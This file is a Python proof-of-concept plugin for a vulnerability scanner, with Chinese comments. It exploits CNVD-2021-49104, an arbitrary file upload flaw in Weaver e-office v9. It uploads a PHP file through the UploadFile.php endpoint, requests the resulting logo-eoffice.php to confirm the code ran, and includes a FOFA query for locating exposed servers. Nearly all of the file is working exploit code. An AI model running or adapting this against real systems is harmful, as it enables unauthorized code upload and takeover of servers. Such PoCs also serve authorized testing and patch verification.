import pocs
from lib import config
import re
import requests
import urllib3
import time
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='泛微e-office任意文件上传漏洞'
        self.vul_name='泛微e-office任意文件上传漏洞'
        self.vul_num='CNVD-2021-49104'
        self.app_name='泛微e-office'
        self.app_version='v9'
        self.author='haochen'
        self.msg='fofa查询：app="泛微-EOffice"'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Connection': 'close',
            'Accept-Language': 'zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
            'Content-Type': 'multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4'}
        self.payload = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
        data = """
--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: image/jpeg

<?php phpinfo();?>

--e64bdf16c554bbc109cecef6451c26a4--
    """
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.post(target,headers=head,verify=False,data=data)
            # 攻击完成后需要将攻击的结果写入
            if response.status_code == 200 and 'logo-eoffice.php' in response.text:
                exp2 = url + '/images/logo/logo-eoffice.php'
                time.sleep(2)
                re2 = requests.get(exp2,headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'})
                if re2.status_code == 200 and 'PHP' in re2.text:
                    att_msg['status'] = 'success'
                    att_msg['msg'] = '存在漏洞 '+exp2
                else:
                    att_msg['status']='failed'
                    att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
            else:
                att_msg['status']='failed'
                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg